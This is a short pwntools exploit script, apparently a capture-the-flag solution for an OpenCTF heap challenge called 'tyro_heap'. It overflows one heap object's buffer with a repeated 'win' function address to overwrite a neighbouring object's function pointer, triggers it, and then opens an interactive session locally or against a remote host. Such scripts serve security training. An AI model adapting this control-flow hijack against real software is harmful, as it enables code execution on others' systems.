#!/usr/bin/env python

from pwn import *
import sys

win = p32(0x08048660)

def create_obj():
	r.sendline('c')
	r.recvuntil("::> ")

def read_b(i, data):
	r.sendline('b')
	r.recvuntil('object id ?:')
	r.sendline(str(i))
	r.recvuntil('give me input_b: ')
	r.sendline(data)
	r.recvuntil("::> ")

def exe_id(i):
	r.sendline('e')
	r.recvuntil('object id ?: ')
	r.sendline(str(i))

def exploit(r):
	r.recvuntil('::> ')
	create_obj()
	create_obj()

	payload = win * 10
	read_b(0, payload)

	exe_id(1)
	r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/vagrant/openCTF/tyro_heap_29d1e9341f35f395475bf16aa988e29b'])
        print util.proc.pidof(r)
        pause()
        exploit(r)